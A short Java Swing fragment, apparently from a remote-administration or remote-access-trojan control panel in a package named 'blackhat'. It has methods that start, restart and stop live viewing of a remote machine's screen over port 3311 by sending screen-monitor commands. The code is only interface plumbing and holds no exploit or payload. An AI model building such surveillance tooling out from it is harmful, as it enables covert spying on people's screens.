    private void Screen(boolean Switch) throws IOException {
        if (Switch) {
            if (Screen != null) {
                Screen = null;
            }
            Screen = new Server_Screen();
            Screen.init(IP_Address, 3311, blackhat.BlackHat.Args.get("PASSWORD"), jPanel1);
            Screen.StartRecevedScreen(jPanel1);

        } else {
            Screen.StopRecevedScreen();
            Screen = null;
        }
    }

    private void ResevedScreen() {
        if (Screen != null) {
            Screen = new Server_Screen();
            Screen.StartRecevedScreen(jPanel1);
        } else if ((JOptionPane.showConfirmDialog(this, blackhat.BlackHat.local.getString("megCreateNewConnection"), blackhat.BlackHat.local.getString("msgTitelConnection"), JOptionPane.OK_CANCEL_OPTION, JOptionPane.QUESTION_MESSAGE)) == 0) {
            Screen = null;
            RestartScreen();
        } else {
            this.MainClass.Connect(Command.STOP_SCREEN_MONITOR);
            jToggleButton1.setSelected(false);
            jToggleButton1ActionPerformed(null);
        }
    }

    private void RestartScreen() {
        try {
            this.MainClass.Connect(Command.STOP_SCREEN_MONITOR);
            Thread.sleep(1000);
            this.MainClass.Connect(Command.SCREEN_MONITOR);
            Screen(true);
        } catch (InterruptedException ex) {
        } catch (IOException ex) {
            JOptionPane.showMessageDialog(this, ex.getMessage(), "Error", JOptionPane.ERROR_MESSAGE);
        }
    }

